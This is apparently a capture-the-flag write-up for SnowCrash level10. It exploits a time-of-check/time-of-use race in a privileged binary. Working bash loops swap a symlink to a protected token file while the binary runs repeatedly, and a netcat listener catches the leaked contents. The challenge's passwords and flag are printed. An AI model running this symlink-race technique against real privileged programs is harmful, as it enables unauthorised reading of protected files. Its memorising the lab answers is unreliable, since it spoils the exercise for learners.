## **level10:**

In this level, I have two files: a binary file and a token file. The binary file takes the token file as an argument, along with the localhost IP address.

```
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
level10@SnowCrash:~$
```

the goal is to bypass file access restrictions to read a token file. The level10 executable checks permissions using the access function before trying to open a file. However, there's a security vulnerability due to the timing difference between checking permissions and opening the file, which allows you to exploit it using a race condition.

```
level10@SnowCrash:~$ strace ./level10 token 127.0.0.1
execve("./level10", ["./level10", "token", "127.0.0.1"], [/* 20 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
access("token", R_OK)                   = -1 EACCES (Permission denied)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "You don't have access to token\n", 31You don't have access to token
) = 31
exit_group(31)                          = ?
level10@SnowCrash:~$
```


- In a first terminal, i create a script (`symlink.sh`) that exploits the race condition. The script repeatedly:
    - Creates a symbolic link to the `token` file, then deletes it again.
    - Creates a temporary file (`/tmp/token_link`).
    - Deletes that file.
    
    The purpose of this loop is to create a situation where the `level10` executable thinks it has permission to access the `link` file while actually trying to open the `token` file:

```
#!/bin/bash

while true; do
		ln -s /home/user/level10/token /tmp/token_link
    rm -f /tmp/token_link
    touch /tmp/token_link
    rm -f /tmp/token_link
done
```
Running this script rapidly creates and deletes the symbolic link, allowing you to take advantage of the timing difference.

- I create another script (spam.sh) that repeatedly executes the level10 executable, attempting to send the contents of the symbolic link:

```
#!/bin/bash

while true; do
    /home/user/level10/level10 /tmp/token_link 127.0.0.1
done
```

I run this script to keep invoking the `level10` executable. It will call the `access` function first, which checks the `link` file’s permissions. If successful, it will then try to open the `token` file.

!!Don't forget to make the scripts executable:


```
chmod +x /tmp/spam.sh 
chmod +x /tmp/symlink.sh
```

- I start by setting up a listener on port 6969 using Netcat (nc):

```
nc -lk 6969
```

The l option makes nc listen for incoming connections, and the k option keeps it running after handling a connection. This is important because the level10 executable will try to send data to this port.

```
level10@SnowCrash:~$ strings ./level10
[…]
sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
[…]
```

- After running both scripts for a while, I check the terminal where Netcat is listening. The `level10` executable should send the contents of the `token` file to your listening Netcat session:

```
level10@SnowCrash:~$ nc -lk 6969
.( ).
woupa2yuojeeaaed06riuj63c
.( ).
```

The password of the next level (level11) is :feulo4b72j7edeahuete3no7c

```
level10@SnowCrash:/$ su flag10
Password:woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$
```